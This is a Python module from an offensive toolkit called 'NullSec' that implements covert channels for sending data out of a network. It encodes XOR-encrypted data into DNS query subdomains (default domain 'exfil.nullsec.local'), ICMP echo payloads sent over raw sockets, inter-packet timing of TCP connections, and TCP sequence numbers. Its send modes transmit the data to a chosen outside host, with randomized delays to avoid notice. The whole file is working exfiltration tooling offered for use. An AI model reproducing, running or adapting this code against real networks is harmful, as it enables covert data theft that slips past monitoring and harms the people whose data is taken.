"""
NullSec Framework — Covert Channel Module
Establish covert communication channels using steganographic techniques.
"""

import os
import json
import struct
import hashlib
import random
import socket
import time
from datetime import datetime
from typing import Dict, List, Optional

try:
    from modules import BaseModule
except ImportError:
    from __init__ import BaseModule


class CovertChannel(BaseModule):
    name = "covertchan"
    description = "Covert data channels — ICMP tunneling, DNS exfil, timing-based encoding"
    category = "stealth"
    version = "1.0.0"

    # Channel types
    CHANNELS = ["icmp", "dns", "timing", "tcp-seq"]

    def validate(self) -> bool:
        channel = self.get_option("channel", "dns")
        if channel not in self.CHANNELS:
            print(f"[!] Unknown channel: {channel}")
            print(f"    Available: {', '.join(self.CHANNELS)}")
            return False
        return True

    def run(self, **kwargs) -> Dict:
        channel = self.get_option("channel", kwargs.get("channel", "dns"))
        mode = self.get_option("mode", kwargs.get("mode", "encode"))
        data = self.get_option("data", kwargs.get("data", ""))
        target = self.get_option("target", kwargs.get("target", ""))
        key = self.get_option("key", kwargs.get("key", "nullsec"))

        print(f"[*] Covert Channel: {channel} ({mode})")

        result = {
            "timestamp": datetime.utcnow().isoformat(),
            "channel": channel,
            "mode": mode,
        }

        handlers = {
            "icmp": self._channel_icmp,
            "dns": self._channel_dns,
            "timing": self._channel_timing,
            "tcp-seq": self._channel_tcp_seq,
        }

        handler = handlers.get(channel)
        if handler:
            channel_result = handler(mode, data, target, key)
            result.update(channel_result)

        return result

    def _channel_icmp(self, mode, data, target, key):
        """ICMP tunnel — hide data in ICMP echo request/reply payloads."""
        result = {}

        if mode == "encode":
            # Build ICMP packets with hidden data
            encrypted = self._encrypt(data, key)
            packets = self._build_icmp_packets(encrypted)
            result["packets"] = len(packets)
            result["encoded_size"] = sum(len(p) for p in packets)
            result["packet_data"] = [p.hex() for p in packets[:5]]  # First 5 samples
            print(f"  [+] Generated {len(packets)} ICMP packets")
            print(f"  [+] Total payload: {result['encoded_size']} bytes")

        elif mode == "decode":
            # Parse ICMP packets
            hex_packets = data.split(",") if isinstance(data, str) else data
            recovered = self._parse_icmp_packets(hex_packets, key)
            result["decoded"] = recovered
            print(f"  [+] Recovered: {len(recovered)} bytes")

        elif mode == "send" and target:
            print(f"  [*] Sending ICMP tunnel to {target}")
            encrypted = self._encrypt(data, key)
            sent = self._send_icmp(encrypted, target)
            result["sent"] = sent

        return result

    def _channel_dns(self, mode, data, target, key):
        """DNS exfiltration — encode data in DNS query subdomains."""
        result = {}
        domain = target or "exfil.nullsec.local"

        if mode == "encode":
            encrypted = self._encrypt(data, key)
            queries = self._build_dns_queries(encrypted, domain)
            result["queries"] = queries
            result["total_queries"] = len(queries)
            print(f"  [+] Generated {len(queries)} DNS queries")
            for q in queries[:5]:
                print(f"      {q}")

        elif mode == "decode":
            lines = data.strip().split("\n") if isinstance(data, str) else data
            recovered = self._parse_dns_queries(lines, domain, key)
            result["decoded"] = recovered
            print(f"  [+] Recovered: {len(recovered)} bytes")

        elif mode == "send" and target:
            encrypted = self._encrypt(data, key)
            queries = self._build_dns_queries(encrypted, domain)
            sent = self._send_dns_queries(queries)
            result["sent"] = sent
            print(f"  [+] Sent {sent} DNS queries")

        return result

    def _channel_timing(self, mode, data, target, key):
        """Timing-based covert channel — encode bits in inter-packet delays."""
        result = {}
        bit_time = float(self.get_option("bit_time", "0.1"))  # seconds per bit

        if mode == "encode":
            encrypted = self._encrypt(data, key)
            bits = "".join(f"{byte:08b}" for byte in encrypted)
            delays = []
            for bit in bits:
                if bit == "1":
                    delays.append(bit_time * 2)  # Long delay = 1
                else:
                    delays.append(bit_time)       # Short delay = 0

            result["bits"] = len(bits)
            result["total_time"] = f"{sum(delays):.1f}s"
            result["delays"] = delays[:20]  # Sample
            print(f"  [+] {len(bits)} bits, estimated time: {sum(delays):.1f}s")

        elif mode == "decode":
            # Decode from timing measurements
            delays = [float(d) for d in data.split(",")]
            threshold = bit_time * 1.5
            bits = "".join("1" if d > threshold else "0" for d in delays)
            # Convert bits back to bytes
            byte_data = bytes(int(bits[i:i+8], 2) for i in range(0, len(bits) - 7, 8))
            recovered = self._decrypt(byte_data, key)
            result["decoded"] = recovered
            print(f"  [+] Decoded {len(delays)} timing measurements")

        elif mode == "send" and target:
            port = int(self.get_option("port", "12345"))
            encrypted = self._encrypt(data, key)
            bits = "".join(f"{byte:08b}" for byte in encrypted)
            sent = self._send_timing(bits, target, port, bit_time)
            result["sent"] = sent

        return result

    def _channel_tcp_seq(self, mode, data, target, key):
        """TCP sequence number covert channel — encode data in ISN values."""
        result = {}

        if mode == "encode":
            encrypted = self._encrypt(data, key)
            # Hide 4 bytes per connection in the ISN
            connections = []
            for i in range(0, len(encrypted), 4):
                chunk = encrypted[i:i+4]
                while len(chunk) < 4:
                    chunk += b"\x00"
                seq = struct.unpack(">I", chunk)[0]
                # Mix with random bits to look natural
                masked = (seq & 0x00FFFFFF) | (random.randint(0, 255) << 24)
                connections.append({
                    "sequence": masked,
                    "hex": f"0x{masked:08x}",
                })

            result["connections"] = connections
            result["total"] = len(connections)
            print(f"  [+] Encoded in {len(connections)} TCP connections")
            for c in connections[:5]:
                print(f"      SEQ: {c['hex']}")

        elif mode == "decode":
            # Decode from sequence numbers
            seqs = [int(s.strip(), 0) for s in data.split(",")]
            byte_data = b""
            for seq in seqs:
                masked = seq & 0x00FFFFFF
                byte_data += struct.pack(">I", masked)[1:]  # Last 3 bytes

            recovered = self._decrypt(byte_data.rstrip(b"\x00"), key)
            result["decoded"] = recovered

        return result

    def _encrypt(self, data, key):
        """Simple XOR encryption with key derivation."""
        if isinstance(data, str):
            data = data.encode()
        key_hash = hashlib.sha256(key.encode()).digest()
        return bytes(b ^ key_hash[i % 32] for i, b in enumerate(data))

    def _decrypt(self, data, key):
        """Decrypt XOR-encrypted data."""
        decrypted = self._encrypt(data, key)  # XOR is symmetric
        return decrypted.decode("utf-8", errors="replace")

    def _build_icmp_packets(self, data, chunk_size=56):
        """Build ICMP echo request packets with embedded data."""
        packets = []
        seq = 0

        for i in range(0, len(data), chunk_size):
            chunk = data[i:i+chunk_size]
            # ICMP header: type(1) + code(1) + checksum(2) + id(2) + seq(2)
            icmp_id = random.randint(1, 65535)
            header = struct.pack(">BBHHH", 8, 0, 0, icmp_id, seq)
            # Pad chunk to consistent size
            padded = chunk + b"\x00" * (chunk_size - len(chunk))
            packet = header + padded
            # Calculate checksum
            chksum = self._icmp_checksum(packet)
            packet = struct.pack(">BBHHH", 8, 0, chksum, icmp_id, seq) + padded
            packets.append(packet)
            seq += 1

        return packets

    def _parse_icmp_packets(self, hex_packets, key):
        """Parse ICMP packets and extract hidden data."""
        data = b""
        for hex_pkt in hex_packets:
            try:
                pkt = bytes.fromhex(hex_pkt.strip())
                payload = pkt[8:]  # Skip ICMP header
                data += payload.rstrip(b"\x00")
            except (ValueError, IndexError):
                pass
        return self._decrypt(data, key)

    def _icmp_checksum(self, data):
        """Calculate ICMP checksum."""
        if len(data) % 2:
            data += b"\x00"
        words = struct.unpack(f">{len(data)//2}H", data)
        total = sum(words)
        total = (total >> 16) + (total & 0xFFFF)
        total += total >> 16
        return ~total & 0xFFFF

    def _build_dns_queries(self, data, domain):
        """Build DNS-style queries with embedded data."""
        import base64
        b32_data = base64.b32encode(data).decode().rstrip("=").lower()
        # DNS label max 63 chars, split into labels
        queries = []
        for i in range(0, len(b32_data), 50):
            chunk = b32_data[i:i+50]
            seq = i // 50
            query = f"{chunk}.{seq:04d}.{domain}"
            queries.append(query)
        return queries

    def _parse_dns_queries(self, queries, domain, key):
        """Parse DNS queries and extract data."""
        import base64
        chunks = {}
        for q in queries:
            q = q.strip()
            if domain in q:
                parts = q.replace(f".{domain}", "").split(".")
                if len(parts) >= 2:
                    try:
                        data = parts[0]
                        seq = int(parts[1])
                        chunks[seq] = data
                    except (ValueError, IndexError):
                        pass

        combined = "".join(chunks[k] for k in sorted(chunks)).upper()
        # Add padding
        padding = 8 - (len(combined) % 8) if len(combined) % 8 else 0
        combined += "=" * padding

        try:
            encrypted = base64.b32decode(combined)
            return self._decrypt(encrypted, key)
        except Exception:
            return ""

    def _send_dns_queries(self, queries):
        """Send DNS queries (to default resolver)."""
        sent = 0
        for query in queries:
            try:
                socket.getaddrinfo(query, None)
            except socket.gaierror:
                pass  # Expected — domain doesn't exist
            sent += 1
            time.sleep(random.uniform(0.1, 0.5))
        return sent

    def _send_icmp(self, data, target):
        """Send ICMP packets with embedded data."""
        packets = self._build_icmp_packets(data)
        sent = 0
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
            for pkt in packets:
                s.sendto(pkt, (target, 0))
                sent += 1
                time.sleep(random.uniform(0.05, 0.2))
            s.close()
        except (PermissionError, OSError) as e:
            print(f"  [!] ICMP send requires root: {e}")
        return sent

    def _send_timing(self, bits, target, port, bit_time):
        """Send timing-encoded data."""
        sent = 0
        for bit in bits:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(1)
                s.connect((target, port))
                s.send(b"\x00")
                s.close()
                sent += 1
            except (socket.error, OSError):
                pass

            delay = bit_time * 2 if bit == "1" else bit_time
            time.sleep(delay)
        return sent


if __name__ == "__main__":
    import sys
    chan = CovertChannel()

    chan.set_option("channel", sys.argv[1] if len(sys.argv) > 1 else "dns")
    chan.set_option("mode", sys.argv[2] if len(sys.argv) > 2 else "encode")
    chan.set_option("data", sys.argv[3] if len(sys.argv) > 3 else "NullSec covert test")

    result = chan.execute()
    print(json.dumps(result, indent=2, default=str))
